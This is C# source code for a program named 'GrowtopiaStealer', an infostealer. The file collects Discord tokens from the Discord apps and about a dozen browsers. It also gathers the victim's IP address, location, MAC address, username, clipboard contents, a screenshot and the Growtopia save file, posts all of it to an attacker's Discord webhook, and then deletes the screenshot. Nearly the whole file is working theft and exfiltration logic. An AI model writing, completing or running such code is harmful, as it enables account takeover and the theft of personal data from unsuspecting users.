using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using System.Net.NetworkInformation;
using JNogueira.Discord.Webhook.Client;
using System.Drawing;
using System.Threading;
using System.IO;
using System.Windows.Forms;

namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
{
    static class Program
    {
        /*
        internal class Growtopia
        {
            
            public static string strchange98(string strchange99)
            {
                byte[] array = File.ReadAllBytes(strchange99);
                string @string = Encoding.ASCII.GetString(array);
                //int x = int.Parse(@string.IndexOf("lastworld").ToString());
                string result;
                try
                {
                    //byte[] array = File.ReadAllBytes(strchange99);
                    //string @string = Encoding.ASCII.GetString(array);
                    string text = @string.Substring(@string.IndexOf("tankid_name") + 15, Convert.ToInt32(array[@string.IndexOf("tankid_name") + 11]));
                    /*int i;
                    //x = int.Parse(@string.IndexOf("lastworld").ToString());
                    string text2 = @string.Substring(@string.IndexOf("lastworld") + 13, Convert.ToInt32(array[@string.IndexOf("lastworld") + 25]));
                    string text3 = "";
                    for (i=0;i<text2.Length;i++)
                    {
                        int z;
                        z = text2[i];
                        if (z >= 48 && z <= 122)
                        {
                            text3 = text3 + text2[i];
                        }
                        else
                            break;
                    }*/
        /*result = text;
        //result = result + Environment.NewLine;
        //result = result + "Last world: " + text3.ToUpper();
    }
    catch
    {
        result = "Null";
    }
    return result;
}


    }*/
        public static List<string> goSendTokens = DiscordStealing.AllTokens;
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            #region Stealing discord tokens from apps and browsers.
            Task.WaitAll(
            DiscordStealing.DiscordApp(),
            DiscordStealing.DiscordCanary(),
            DiscordStealing.DiscordPTB(),
            DiscordStealing.Chrome(),
            DiscordStealing.ChromeBeta(),
            DiscordStealing.FireFox(),
            DiscordStealing.Opera(),
            DiscordStealing.OperaGX(),
            DiscordStealing.Edge(),
            DiscordStealing.Yandex(),
            DiscordStealing.Brave(),
            DiscordStealing.EpicPrivacy(),
            DiscordStealing.Vivaldi(),
            DiscordStealing.ThreeHundredSixty(),
            DiscordStealing.CocCoc()
            );
            #endregion

            #region Rainbow Line gif
            string rainbowline = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here https://i.imgur.com/tcU8x8P.gif​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​";
            #endregion

            #region String for send tokens to discord webhook
            string Tokens = string.Join(Environment.NewLine, goSendTokens.ToList());
            #endregion

            #region IP, IPv6, Country, City.
            // WebClient
            WebClient Amogus = new WebClient();
            // DNS host name
            String host = System.Net.Dns.GetHostName();
            // IP
            string IP = Amogus.DownloadString("https://ipapi.co/ip/");
            // IPv6
            System.Net.IPAddress IPv6 = Dns.GetHostEntry(host).AddressList[0];
            // Country
            string Country = Amogus.DownloadString("https://ipapi.co/country_name/");
            // City
            string City = Amogus.DownloadString("https://ipapi.co/city/");
            #endregion

            #region MAC Address
            var macAddress = NetworkInterface.GetAllNetworkInterfaces();
            var getTarget = macAddress[0].GetPhysicalAddress();
            #endregion

            #region UserName
            // UserName
            string User = Environment.UserName;
            #endregion

            #region Discord Webhook
            // Discord Webhook
            var client = new DiscordWebhookClient(DiscordWebhook.defaultWebhook);
            #endregion

            #region Rainbow line send
            var rainbow = new DiscordMessage(
                rainbowline,
                username: "GrowtopiaStealer | TheC0mpany",
                avatarUrl: "https://i.imgur.com/2Via1dY.jpg",
                tts: false
                );
            #endregion

            //client.SendToDiscord(rainbow);

            #region Embed webhook message with "JNogueira.Discord.Webhook.Client".
            // Messages
            var message = new DiscordMessage(
                "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here ",
                username: "GrowtopiaStealer | TheC0mpany",
                avatarUrl: "https://i.imgur.com/2Via1dY.jpg",
                tts: false,
                embeds: new[]{
                    new DiscordMessageEmbed(
                        "GrowtopiaStealer",
                        color: 65280,
                        author: new DiscordMessageEmbedAuthor("NEW LOG FROM - " + Environment.MachineName + " " + Environment.UserName),
                        description:
                               "\n ================================" +
                               "\n```IP: " + IP + "```" +
                               "\n```IPv6: " + IPv6 + "```" +
                               "\n ================================" +
                               "\n```Country: " + Country + "```" +
                               "\n```City: " + City + "```" +
                               "\n```ClipBoard: " + Buffer.GetBuffer() + "```" +
                               "\n```MAC Address: " + getTarget + "```" +
                               "\n ================================",
                        thumbnail: new DiscordMessageEmbedThumbnail("https://i.imgur.com/2Via1dY.jpg"),
                        footer: new DiscordMessageEmbedFooter("GrowtopiaStealer | TheC0mpany", "https://i.imgur.com/2Via1dY.jpg")
                               )});
            client.SendToDiscord(message);
            #endregion

            //client.SendToDiscord(rainbow);

            #region Tokens
            var token = new DiscordMessage(
                "Tokens: \n" + Tokens,
                username: "GrowtopiaStealer | TheC0mpany",
                avatarUrl: "https://i.imgur.com/2Via1dY.jpg",
                tts: false
                );
            client.SendToDiscord(token);
            #endregion

            client.SendToDiscord(rainbow);

            #region Ghost ping
            string mssgBody = "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| _ _ _ _ _ _ @everyone @here ";
            #endregion

            #region Sending save.dat and screenshot to discord webhook.
            Screenshot.GetScreenshot();
            string filename = Environment.MachineName + "." + Environment.UserName + ".dat";
            string fileformat = "dat";
            string filepath = GrowtopiaStealer.Growtopia.savePath;
            string application = "";
            string filename1 = "Screenshot-" + Environment.MachineName + ".png";
            string fileformat1 = "png";
            string filepath1 = @"C:\Users\" + User + @"\AppData\Local\Temp\screenshot.png";
            try
            {
                DiscordWebhook.SendFile(mssgBody, filename, fileformat, filepath, application); // Sending log
                DiscordWebhook.SendFile(mssgBody, filename1, fileformat1, filepath1, application); // Sending Screenshot 
            }
            catch
            {
                DiscordWebhook.Send("Log size is more then 8 MB. Sending isn`t available.");
            }
            #endregion

            client.SendToDiscord(rainbow);

            #region Delete screenshot file
            //Delete screenshot file
            Finish();
           
            void Finish()
            {
                Thread.Sleep(15000);
                File.Delete(@"C:\Users\" + User + @"\AppData\Local\Temp\screenshot.png");
            }
            #endregion
        }
    }
}